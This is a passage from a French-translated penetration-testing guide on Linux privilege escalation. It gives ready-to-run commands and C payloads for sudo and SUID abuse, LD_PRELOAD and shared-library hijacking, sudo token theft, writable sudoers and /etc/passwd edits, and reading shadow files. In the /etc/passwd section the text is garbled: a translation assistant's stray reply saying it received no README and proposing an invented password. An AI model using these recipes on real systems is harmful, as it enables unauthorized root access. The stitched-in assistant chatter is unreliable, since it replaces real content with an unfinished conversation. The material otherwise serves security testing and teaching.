Il est toujours utile d'énumérer le réseau et de déterminer la position de la machine.

### Énumération générique
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

Vérifiez toujours les services réseau en cours d'exécution sur la machine avec lesquels vous n'avez pas pu interagir avant d'y accéder :
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Vérifiez si vous pouvez sniff le trafic. Si vous le pouvez, vous pourriez être en mesure de récupérer des credentials.
```
timeout 1 tcpdump
```
## Utilisateurs

### Énumération Générique

Vérifiez **qui** vous êtes, quels **privilèges** vous avez, quels **utilisateurs** sont sur le système, lesquels peuvent **se connecter** et lesquels ont des **privilèges root** :
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Certaines versions de Linux ont été affectées par un bug qui permet aux utilisateurs avec **UID > INT_MAX** d'escalader leurs privilèges. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploitez-le** en utilisant : **`systemd-run -t /bin/bash`**

### Groupes

Vérifiez si vous êtes **membre d'un groupe** qui pourrait vous accorder les privilèges root :


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Presse-papiers

Vérifiez si quelque chose d'intéressant se trouve dans le presse-papiers (si possible)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Politique de mots de passe
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Mots de passe connus

Si vous **connaissez un mot de passe** de l'environnement **essayez de vous connecter en tant que chaque utilisateur** en utilisant ce mot de passe.

### Su Brute

Si vous ne craignez pas de faire beaucoup de bruit et que les binaires `su` et `timeout` sont présents sur l'ordinateur, vous pouvez essayer de brute-force des utilisateurs en utilisant [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) avec le paramètre `-a` tente aussi de brute-force des utilisateurs.

## Abus du $PATH inscriptible

### $PATH

Si vous constatez que vous pouvez **écrire dans un dossier du $PATH**, vous pourriez être capable d'escalader les privilèges en **créant une backdoor dans le dossier inscriptible** portant le nom d'une commande qui sera exécutée par un autre utilisateur (idéalement root) et qui **n'est pas chargée depuis un dossier situé avant** votre dossier inscriptible dans le $PATH.

### SUDO and SUID

Vous pourriez être autorisé à exécuter certaines commandes via sudo ou celles-ci pourraient avoir le bit suid. Vérifiez-le en utilisant:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Certaines commandes **inattendues vous permettent de lire et/ou d'écrire des fichiers ou même d'exécuter une commande.** Par exemple :
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

La configuration sudo peut permettre à un utilisateur d'exécuter certaines commandes avec les privilèges d'un autre utilisateur sans connaître le mot de passe.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Dans cet exemple, l'utilisateur `demo` peut exécuter `vim` en tant que `root`. Il est alors trivial d'obtenir un shell en ajoutant une ssh key dans le répertoire root ou en appelant `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Cette directive permet à l'utilisateur de **définir une variable d'environnement** lors de l'exécution d'une commande :
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Cet exemple, **basé sur la machine HTB Admirer**, était **vulnérable** au **PYTHONPATH hijacking** pour charger une bibliothèque python arbitraire lors de l'exécution du script en tant que root :
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV conservé via sudo env_keep → root shell

Si sudoers conserve `BASH_ENV` (par ex., `Defaults env_keep+="ENV BASH_ENV"`), vous pouvez tirer parti du comportement de démarrage non interactif de Bash pour exécuter du code arbitraire en tant que root lors de l'appel d'une commande autorisée.

- Why it works: Pour les shells non interactifs, Bash évalue `$BASH_ENV` et source ce fichier avant d'exécuter le script ciblé. De nombreuses règles sudo permettent d'exécuter un script ou un wrapper shell. Si `BASH_ENV` est conservé par sudo, votre fichier est sourcé avec les privilèges root.

- Prérequis:
- Une règle sudo que vous pouvez exécuter (n'importe quelle cible qui invoque `/bin/bash` de manière non interactive, ou tout script bash).
- `BASH_ENV` présent dans `env_keep` (vérifier avec `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- Supprimez `BASH_ENV` (et `ENV`) de `env_keep`, privilégiez `env_reset`.
- Évitez les wrappers de shell pour les commandes autorisées par sudo ; utilisez des binaires minimaux.
- Envisagez la journalisation I/O et les alertes pour sudo lorsque des variables d'environnement préservées sont utilisées.

### Sudo execution bypassing paths

**Aller** lire d'autres fichiers ou utiliser des **symlinks**. Par exemple dans le fichier sudoers : _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Si un **wildcard** est utilisé (\*), c'est encore plus facile :
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Contremesures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary sans chemin de commande

Si la **permission sudo** est accordée pour une seule commande **sans spécifier le chemin** : _hacker10 ALL= (root) less_ vous pouvez l'exploiter en modifiant la variable PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Cette technique peut également être utilisée si un **suid** binary **exécute une autre commande sans préciser son chemin (vérifiez toujours avec** _**strings**_ **le contenu d'un SUID étrange)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary avec chemin de commande

Si le **suid** binary **exécute une autre commande en spécifiant le chemin**, alors, vous pouvez essayer d'**exporter une fonction** portant le nom de la commande que le fichier suid appelle.

Par exemple, si un suid binary appelle _**/usr/sbin/service apache2 start**_ vous devez essayer de créer la fonction et de l'exporter :
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Ensuite, lorsque vous appelez le binaire suid, cette fonction sera exécutée

### LD_PRELOAD & **LD_LIBRARY_PATH**

La variable d'environnement **LD_PRELOAD** est utilisée pour spécifier une ou plusieurs bibliothèques partagées (fichiers .so) à charger par le loader avant toutes les autres, y compris la bibliothèque C standard (`libc.so`). Ce processus est appelé préchargement d'une bibliothèque.

Cependant, pour maintenir la sécurité du système et empêcher l'exploitation de cette fonctionnalité, en particulier avec les exécutables **suid/sgid**, le système impose certaines conditions :

- Le loader ignore **LD_PRELOAD** pour les exécutables dont l'ID utilisateur réel (_ruid_) ne correspond pas à l'ID utilisateur effectif (_euid_).
- Pour les exécutables suid/sgid, seules les bibliothèques situées dans des chemins standard et qui sont elles-mêmes suid/sgid sont préchargées.

L'escalade de privilèges peut se produire si vous pouvez exécuter des commandes avec `sudo` et que la sortie de `sudo -l` inclut la mention **env_keep+=LD_PRELOAD**. Cette configuration permet à la variable d'environnement **LD_PRELOAD** de persister et d'être prise en compte même lorsque des commandes sont exécutées avec `sudo`, ce qui peut conduire à l'exécution de code arbitraire avec des privilèges élevés.
```
Defaults        env_keep += LD_PRELOAD
```
Enregistrer sous **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Ensuite, **compilez-le** en utilisant :
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Enfin, **escalate privileges** en exécutant
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Un privesc similaire peut être abusé si l'attaquant contrôle la variable d'environnement **LD_LIBRARY_PATH** car il contrôle le chemin où les bibliothèques seront recherchées.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Lorsque vous rencontrez un binaire avec les permissions **SUID** qui semble inhabituel, il est recommandé de vérifier s'il charge correctement les fichiers **.so**. Cela peut être vérifié en exécutant la commande suivante :
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Par exemple, la présence d'une erreur telle que _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ suggère une possibilité d'exploitation.

Pour l'exploiter, on créerait un fichier C, par exemple _"/path/to/.config/libcalc.c"_, contenant le code suivant :
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ce code, une fois compilé et exécuté, vise à élever les privilèges en manipulant les permissions des fichiers et en lançant un shell avec des privilèges élevés.

Compilez le fichier C ci-dessous en un objet partagé (.so) avec :
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Enfin, exécuter le SUID binary affecté devrait déclencher l'exploit, permettant une compromission potentielle du système.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Maintenant que nous avons trouvé un SUID binary qui charge une library depuis un dossier où nous pouvons écrire, créons la library dans ce dossier avec le nom nécessaire :
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Si vous obtenez une erreur telle que
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
cela signifie que la bibliothèque que vous avez générée doit contenir une fonction appelée `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) est une liste sélectionnée de binaires Unix qui peuvent être exploités par un attaquant pour contourner les restrictions de sécurité locales. [**GTFOArgs**](https://gtfoargs.github.io/) est la même chose mais pour les cas où vous pouvez **uniquement injecter des arguments** dans une commande.

Le projet recense des fonctions légitimes de binaires Unix qui peuvent être détournées pour sortir de shells restreints, escalader ou conserver des privilèges élevés, transférer des fichiers, lancer des bind et reverse shells, et faciliter les autres tâches de post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Si vous pouvez exécuter `sudo -l` vous pouvez utiliser l'outil [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) pour vérifier s'il trouve comment exploiter une règle sudo.

### Reusing Sudo Tokens

Dans les cas où vous avez **sudo access** mais pas le mot de passe, vous pouvez escalader les privilèges en **attendant l'exécution d'une commande sudo puis en détournant le jeton de session**.

Requirements to escalate privileges:

- Vous avez déjà un shell en tant qu'utilisateur "_sampleuser_"
- "_sampleuser_" a **utilisé `sudo`** pour exécuter quelque chose **dans les 15 dernières minutes** (par défaut c'est la durée du sudo token qui nous permet d'utiliser `sudo` sans saisir de mot de passe)
- `cat /proc/sys/kernel/yama/ptrace_scope` is 0
- `gdb` est accessible (vous pouvez le téléverser)

(You can temporarily enable `ptrace_scope` with `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` or permanently modifying `/etc/sysctl.d/10-ptrace.conf` and setting `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Le **deuxième exploit** (`exploit_v2.sh`) créera un sh shell dans _/tmp_ **appartenant à root avec le bit setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Le **troisième exploit** (`exploit_v3.sh`) **créera un sudoers file** qui **rend les sudo tokens éternels et permet à tous les utilisateurs d'utiliser sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Si vous avez des **permissions d'écriture** dans le dossier ou sur n'importe lequel des fichiers créés à l'intérieur du dossier vous pouvez utiliser le binaire [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) pour **créer un sudo token pour un utilisateur et PID**.\
Par exemple, si vous pouvez écraser le fichier _/var/run/sudo/ts/sampleuser_ et que vous avez un shell en tant que cet utilisateur avec PID 1234, vous pouvez **obtenir des privilèges sudo** sans avoir besoin du mot de passe en faisant:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Le fichier `/etc/sudoers` et les fichiers à l'intérieur de `/etc/sudoers.d` configurent qui peut utiliser `sudo` et comment. Ces fichiers **par défaut ne peuvent être lus que par l'utilisateur root et le groupe root**.\
**Si** vous pouvez **lire** ce fichier, vous pourriez être en mesure **d'obtenir des informations intéressantes**, et si vous pouvez **écrire** n'importe quel fichier vous pourrez **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Si vous pouvez écrire, vous pouvez abuser de cette permission
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Une autre façon d'abuser de ces permissions :
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Il existe des alternatives au binaire `sudo` telles que `doas` pour OpenBSD ; pensez à vérifier sa configuration dans `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Si vous savez qu'un **utilisateur se connecte habituellement à une machine et utilise `sudo`** pour escalader les privilèges et que vous avez obtenu un shell dans ce contexte utilisateur, vous pouvez **créer un nouvel exécutable sudo** qui exécutera votre code en tant que root puis la commande de l'utilisateur. Ensuite, **modifiez le $PATH** du contexte utilisateur (par exemple en ajoutant le nouveau chemin dans .bash_profile) afin que lorsque l'utilisateur exécute sudo, votre exécutable sudo soit lancé.

Notez que si l'utilisateur utilise un shell différent (pas bash) vous devrez modifier d'autres fichiers pour ajouter le nouveau chemin. Par exemple[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifie `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Vous pouvez trouver un autre exemple dans [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ou en exécutant quelque chose comme :
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Bibliothèque partagée

### ld.so

Le fichier `/etc/ld.so.conf` indique **d'où proviennent les fichiers de configuration chargés**. Typiquement, ce fichier contient le chemin suivant : `include /etc/ld.so.conf.d/*.conf`

Cela signifie que les fichiers de configuration situés dans `/etc/ld.so.conf.d/*.conf` seront lus. Ces fichiers de configuration **pointent vers d'autres dossiers** où les **libraries** vont être **recherchées**. Par exemple, le contenu de `/etc/ld.so.conf.d/libc.conf` est `/usr/local/lib`. **Cela signifie que le système cherchera des libraries dans `/usr/local/lib`**.

Si pour une raison quelconque **un utilisateur possède des permissions d'écriture** sur l'un des chemins indiqués : `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, n'importe quel fichier à l'intérieur de `/etc/ld.so.conf.d/` ou n'importe quel dossier référencé dans un fichier de configuration dans `/etc/ld.so.conf.d/*.conf` il peut être en mesure d'escalader les privilèges.\
Regardez **comment exploiter cette mauvaise configuration** dans la page suivante :


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
En copiant la lib dans `/var/tmp/flag15/`, elle sera utilisée par le programme à cet emplacement, comme spécifié dans la variable `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Ensuite, créez une bibliothèque malveillante dans `/var/tmp` avec `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capacités

Les capacités Linux fournissent un **sous-ensemble des privilèges root disponibles à un process**. Cela segmente effectivement les privilèges root **en unités plus petites et distinctes**. Chacune de ces unités peut ensuite être accordée indépendamment aux processus. De cette façon, l'ensemble complet des privilèges est réduit, diminuant les risques d'exploitation.\
Lisez la page suivante pour **en savoir plus sur les capacités et comment les abuser** :


{{#ref}}
linux-capabilities.md
{{#endref}}

## Permissions des répertoires

Dans un répertoire, le **bit pour "execute"** implique que l'utilisateur concerné peut **"cd"** dans le dossier.\
Le **bit "read"** implique que l'utilisateur peut **list** les **files**, et le **bit "write"** implique que l'utilisateur peut **delete** et **create** de nouveaux **files**.

## ACLs

Les Access Control Lists (ACLs) représentent la couche secondaire des permissions discrétionnaires, capables de **outrepasser les permissions traditionnelles ugo/rwx**. Ces permissions améliorent le contrôle d'accès aux fichiers ou répertoires en autorisant ou refusant des droits à des utilisateurs spécifiques qui ne sont ni propriétaires ni membres du groupe. Ce niveau de **granularité assure une gestion des accès plus précise**. Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Donner** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Obtenir** des fichiers ayant des ACL spécifiques du système:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Sessions shell ouvertes

Dans les **anciennes versions** vous pouvez **hijack** certaines sessions **shell** d'un autre utilisateur (**root**).\
Dans les **nouvelles versions** vous pourrez **connect** uniquement aux screen sessions de **votre propre utilisateur**. Cependant, vous pourriez trouver des **informations intéressantes à l'intérieur de la session**.

### screen sessions hijacking

**Lister les screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Se connecter à une session**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Détournement de sessions tmux

C'était un problème avec **anciennes versions de tmux**. Je n'ai pas pu détourner une session tmux (v2.1) créée par root en tant qu'utilisateur non privilégié.

**Lister les sessions tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Se connecter à une session**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** pour un exemple.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\
Ce bug se produit lors de la création d'une nouvelle clé ssh sur ces OS, car **only 32,768 variations were possible**. Cela signifie que toutes les possibilités peuvent être calculées et **having the ssh public key you can search for the corresponding private key**. You can find the calculated possibilities here: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Spécifie si l'authentification par mot de passe est autorisée. La valeur par défaut est `no`.
- **PubkeyAuthentication:** Spécifie si l'authentification par clé publique est autorisée. La valeur par défaut est `yes`.
- **PermitEmptyPasswords**: Lorsque l'authentification par mot de passe est autorisée, cela spécifie si le serveur permet la connexion à des comptes avec des mots de passe vides. La valeur par défaut est `no`.

### PermitRootLogin

Spécifie si root peut se connecter via ssh, la valeur par défaut est `no`. Valeurs possibles :

- `yes`: root peut se connecter en utilisant un mot de passe et une clé privée
- `without-password` or `prohibit-password`: root ne peut se connecter qu'avec une clé privée
- `forced-commands-only`: root ne peut se connecter qu'avec une clé privée et uniquement si des options de commandes sont spécifiées
- `no` : non

### AuthorizedKeysFile

Spécifie les fichiers qui contiennent les clés publiques pouvant être utilisées pour l'authentification des utilisateurs. Il peut contenir des tokens comme `%h`, qui seront remplacés par le répertoire personnel. **You can indicate absolute paths** (starting in `/`) ou **relative paths from the user's home**. Par exemple:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Cette configuration indiquera que si vous essayez de vous connecter avec la clé **private** de l'utilisateur "**testusername**", ssh comparera la public key de votre clé avec celles situées dans `/home/testusername/.ssh/authorized_keys` et `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding vous permet de **use your local SSH keys instead of leaving keys** (without passphrases!) sitting on your server. Ainsi, vous pourrez **jump** via ssh **to a host** et, de là, **jump to another** host **using** the **key** située sur votre **initial host**.

Vous devez définir cette option dans `$HOME/.ssh.config` comme ceci:
```
Host example.com
ForwardAgent yes
```
Remarquez que si `Host` est `*`, chaque fois que l'utilisateur se connecte à une machine différente, cette machine pourra accéder aux clés (ce qui constitue un problème de sécurité).

Le fichier `/etc/ssh_config` peut **surcharger** ces **options** et autoriser ou refuser cette configuration.\
Le fichier `/etc/sshd_config` peut **autoriser** ou **interdire** ssh-agent forwarding avec le mot-clé `AllowAgentForwarding` (par défaut autorisé).

Si vous trouvez que Forward Agent est configuré dans un environnement, lisez la page suivante car **vous pourriez être capable de l'abuser pour obtenir une élévation de privilèges** :


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Fichiers intéressants

### Fichiers de profil

Le fichier `/etc/profile` et les fichiers sous `/etc/profile.d/` sont **des scripts qui sont exécutés lorsqu'un utilisateur lance un nouveau shell**. Par conséquent, si vous pouvez **écrire ou modifier l'un d'eux, vous pouvez obtenir une élévation de privilèges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Si un script de profil suspect est trouvé, vous devriez le vérifier pour des **détails sensibles**.

### Fichiers Passwd/Shadow

Selon l'OS, les fichiers `/etc/passwd` et `/etc/shadow` peuvent porter un nom différent ou il peut exister une sauvegarde. Il est donc recommandé de **les trouver tous** et de **vérifier si vous pouvez les lire** pour voir **s'il y a des hashes** dans ces fichiers :
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Il arrive que vous trouviez **password hashes** dans le fichier `/etc/passwd` (ou équivalent)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### /etc/passwd modifiable en écriture

Tout d'abord, générez un mot de passe avec l'une des commandes suivantes.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Je n’ai pas reçu le contenu de src/linux-hardening/privilege-escalation/README.md à traduire. Peux-tu coller le texte du fichier ici ?

Si tu veux que j’ajoute une ligne au README traduit pour créer l’utilisateur hacker avec un mot de passe généré, confirme-le. Exemple de mot de passe généré (modifiable) : S%7rPq9!xB4m

Commande (exemple) pour créer l’utilisateur et définir le mot de passe sur une machine Linux (ne l’exécute pas ici, c’est juste pour documentation) :
```
sudo useradd -m hacker
echo 'hacker:S%7rPq9!xB4m' | sudo chpasswd
```

Indique si tu veux :
- que j’intègre la ligne "Utilisateur: hacker — Mot de passe: S%7rPq9!xB4m" dans la traduction du README, et
- si tu préfères un mot de passe différent ou un format particulier.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Exemple : `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Vous pouvez maintenant utiliser la commande `su` avec `hacker:hacker`

Autrement, vous pouvez utiliser les lignes suivantes pour ajouter un utilisateur factice sans mot de passe.\
ATTENTION : vous pourriez dégrader la sécurité actuelle de la machine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
REMARQUE : Sur les plateformes BSD, `/etc/passwd` se trouve à `/etc/pwd.db` et `/etc/master.passwd`, aussi `/etc/shadow` est renommé en `/etc/spwd.db`.

Vous devriez vérifier si vous pouvez **écrire dans certains fichiers sensibles**. Par exemple, pouvez-vous écrire dans un **fichier de configuration de service** ?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Par exemple, si la machine exécute un serveur **tomcat** et que vous pouvez **modifier le fichier de configuration du service Tomcat dans /etc/systemd/,** alors vous pouvez modifier les lignes :
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Votre backdoor sera exécutée la prochaine fois que tomcat sera démarré.

### Vérifier les dossiers

Les dossiers suivants peuvent contenir des sauvegardes ou des informations intéressantes : **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Vous ne pourrez probablement pas lire le dernier, mais essayez)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Emplacement étrange/fichiers Owned
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
